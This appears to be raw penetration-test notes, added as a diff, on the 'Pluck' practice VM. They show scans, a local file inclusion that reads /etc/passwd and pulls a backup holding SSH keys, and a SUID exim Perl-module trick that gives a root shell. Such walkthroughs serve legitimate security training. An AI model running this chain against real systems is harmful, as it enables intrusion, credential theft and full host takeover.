@@ -1,0 +1,183 @@
+
+
+
+└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.34
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-29 16:37 CEST
+Nmap scan report for 192.168.110.34
+Host is up (0.00048s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
+|   256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
+|_  256 18:98:5a:5a:5c:59:e1:25:70:1c:37:1a:f2:c7:26:fe (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL (unauthorized)
+5355/tcp open  llmnr?
+MAC Address: 08:00:27:77:CF:B2 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.48 ms 192.168.110.34
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 147.88 seconds
+
+
+
+└─$ dirb http://192.168.110.34
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jun 29 16:43:50 2021
+URL_BASE: http://192.168.110.34/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.110.34/ ----
++ http://192.168.110.34/admin.php (CODE:200|SIZE:2721)                                                                                                      
+==> DIRECTORY: http://192.168.110.34/css/
+==> DIRECTORY: http://192.168.110.34/fonts/
+==> DIRECTORY: http://192.168.110.34/images/
++ http://192.168.110.34/index.php (CODE:200|SIZE:2309)
+==> DIRECTORY: http://192.168.110.34/js/
++ http://192.168.110.34/server-status (CODE:403|SIZE:302)
+                                                                                                                                                            
+---- Entering directory: http://192.168.110.34/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                            
+---- Entering directory: http://192.168.110.34/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                            
+---- Entering directory: http://192.168.110.34/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                            
+---- Entering directory: http://192.168.110.34/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Tue Jun 29 16:43:51 2021
+DOWNLOADED: 4612 - FOUND: 3
+
+
+curl http://192.168.110.34/index.php?page=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:108:65534::/var/lib/lxd/:/bin/false
+uuidd:x:109:114::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+
+
+curl http://192.168.110.34/index.php?page=/usr/local/scripts/backup.sh
+
+!/bin/bash
+
+########################
+# Server Backup script #
+########################
+
+#Backup directories in /backups so we can get it via tftp
+
+echo "Backing up data"
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
+echo "Backup complete"
+
+
+curl http://192.168.110.34/index.php?page=php://filter/convert.base64-encode/resource=/backups/backup.tar
+
+
+┌──(kali㉿kali)-[~/OSCP/boxes/pluck/home]
+└─$ ls -al
+total 20
+drwxr-xr-x 5 kali kali 4096 Jan 18  2017 .
+drwxr-xr-x 4 kali kali 4096 Jun 29 17:02 ..
+drwxr-xr-x 2 kali kali 4096 Jan 18  2017 bob
+drwxr-xr-x 3 kali kali 4096 Jan 18  2017 paul
+drwxr-xr-x 2 kali kali 4096 Jan 18  2017 peter
+
+                                                                                                                                                      
+┌──(kali㉿kali)-[~/…/pluck/home/paul/keys]
+└─$ ls -al  
+total 56
+drwxr-xr-x 2 kali kali 4096 Jan 18  2017 .
+drwxr-xr-x 3 kali kali 4096 Jan 18  2017 ..
+-rwxr-xr-x 1 kali kali  668 Jan 18  2017 id_key1
+-rwxr-xr-x 1 kali kali  600 Jan 18  2017 id_key1.pub
+-rwxr-xr-x 1 kali kali  672 Jan 18  2017 id_key2
+-rwxr-xr-x 1 kali kali  600 Jan 18  2017 id_key2.pub
+-rwxr-xr-x 1 kali kali  668 Jan 18  2017 id_key3
+-rwxr-xr-x 1 kali kali  600 Jan 18  2017 id_key3.pub
+-rwxr-xr-x 1 kali kali 1679 Jan 18  2017 id_key4
+-rwxr-xr-x 1 kali kali  392 Jan 18  2017 id_key4.pub
+-rwxr-xr-x 1 kali kali  668 Jan 18  2017 id_key5
+-rwxr-xr-x 1 kali kali  600 Jan 18  2017 id_key5.pub
+-rwxr-xr-x 1 kali kali 1675 Jan 18  2017 id_key6
+-rwxr-xr-x 1 kali kali  392 Jan 18  2017 id_key6.pub
+
+
+paul@pluck:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/exim/bin/exim-4.84-7
+
+https://www.exploit-db.com/exploits/39535
+paul@pluck:~$ cat > /tmp/root.pm << EOF
+> package root;
+> use strict;
+> use warnings;
+> 
+> system("/bin/sh");
+> EOF
+paul@pluck:~$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
+# id
+uid=0(root) gid=1002(paul) groups=1002(paul)
